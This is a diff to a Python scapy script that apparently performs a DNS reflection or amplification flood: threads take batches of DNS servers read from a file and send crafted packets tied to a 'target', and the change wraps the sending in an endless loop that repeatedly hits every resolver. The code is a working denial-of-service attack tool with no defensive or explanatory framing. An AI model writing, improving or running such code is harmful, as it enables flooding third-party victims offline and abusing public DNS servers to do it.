@@ -1,4 +1,5 @@
 import sys
+import time
 import threading
 from scapy.volatile import RandShort
 from scapy.sendrecv import send
@@ -27,7 +28,8 @@ def send_packet(target, dns):
             )
         )
     )
-    send(packet, loop=1, verbose=False, inter=0.1, realtime=False)
+    send(packet, verbose=False, realtime=False)
+    # send(packet, loop=1, verbose=False, inter=0.1, realtime=False)
 
 def process_dns_batch(target, dns_batch):
     """
@@ -39,11 +41,15 @@ def process_dns_batch(target, dns_batch):
     thread_name = threading.current_thread().name
     print(f"{thread_name} processing {len(dns_batch)} DNS servers")
     
-    for dns in dns_batch:
-        try:
-            send_packet(target, dns.strip())
-        except Exception as e:
-            print(f"Error processing DNS {dns}: {e}")
+    while True:
+        for dns in dns_batch:
+            try:
+                print(dns)
+                send_packet(target, dns.strip())
+            except Exception as e:
+                print(f"Error processing DNS {dns}: {e}")
+
+        time.sleep(0.1)
 
 def main(target, batch_size=500):
     # Read DNS servers from file
